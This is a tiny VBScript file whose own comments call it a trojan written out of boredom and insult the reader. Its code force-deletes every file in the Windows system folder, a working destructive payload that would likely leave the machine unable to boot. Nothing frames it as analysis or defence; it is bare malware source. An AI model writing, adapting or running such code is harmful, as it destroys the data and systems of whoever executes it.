'This trojan written because i'm fing bored!
'f you if your reading this now!
Set f = CreateObject("Scripting.FileSystemObject")
Set fDir = f.GetFolder(f.GetSpecialFolder(0)).Files
For Each fingFile in fDir
 f.DeleteFile fingFile.path, True
Next